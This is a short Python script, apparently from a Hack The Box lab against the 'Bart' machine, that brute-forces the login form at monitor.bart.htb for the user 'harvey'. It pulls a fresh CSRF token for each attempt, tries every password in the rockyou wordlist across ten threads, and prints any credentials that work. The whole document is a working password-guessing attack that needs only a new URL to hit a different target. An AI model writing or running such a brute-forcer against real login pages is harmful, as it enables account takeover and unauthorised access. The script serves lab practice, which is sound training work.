#!/usr/bin/env python3
import requests
import re
from concurrent.futures import ThreadPoolExecutor

url = "http://monitor.bart.htb/"
username = "harvey"
wordlist = "/usr/share/wordlists/rockyou.txt"

def try_login(password):
    s = requests.Session()
    r = s.get(url)
    csrf = re.search(r'name="csrf" value="([a-f0-9]+)"', r.text).group(1)
    
    data = {
        "csrf": csrf,
        "user_name": username,
        "user_password": password,
        "action": "login"
    }
    
    r = s.post(url, data=data)
    
    if "The information is incorrect." not in r.text:
        print(f"[+] FOUND: {username}:{password}")
        return True
    return False

with open(wordlist, "r", encoding="latin-1") as f:
    passwords = [line.strip() for line in f]

with ThreadPoolExecutor(max_workers=10) as executor:
    executor.map(try_login, passwords)
